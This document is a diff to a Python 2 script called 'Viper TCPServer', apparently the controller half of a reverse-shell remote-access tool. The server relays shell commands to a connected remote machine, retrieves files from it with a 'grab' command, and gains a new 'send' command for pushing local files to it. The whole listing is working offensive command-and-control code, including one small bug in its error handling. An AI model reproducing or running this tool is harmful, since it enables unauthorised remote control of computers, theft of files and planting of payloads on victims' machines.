@@ -9,11 +9,9 @@ import os
 
 def banner():
     print """
-
     Name : Viper TCPServer by Black Signals
     Date : 03 March 17
     Version : v1.0
-
 #   __   _____ ___ ___ ___   
 #   \ \ / /_ _| _ \ __| _ \  #
 #    \ V / | ||  _/ _||   /  #
@@ -52,6 +50,19 @@ def transfer(conn,command):
         f.write(bits)
     f.close()
 
+def send(s, path, command):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while packet != '':
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE')
+        print('[+] File Sent!')
+        f.close()
+    else:
+        print('File does not exist')
+
 
 
 def connect():
@@ -75,6 +86,14 @@ def connect():
         elif 'grab' in command:
             #usage shell > grab*file
             transfer(conn,command)
+        elif 'send' in command:
+            conn.send(command)
+            sendW,path = command.split('*')
+            try:
+                send(conn, path, command)
+            except Exception,e:
+                s.send (str(e))
+                pass
         else:
             conn.send(command) #send command
             print conn.recv(1024)
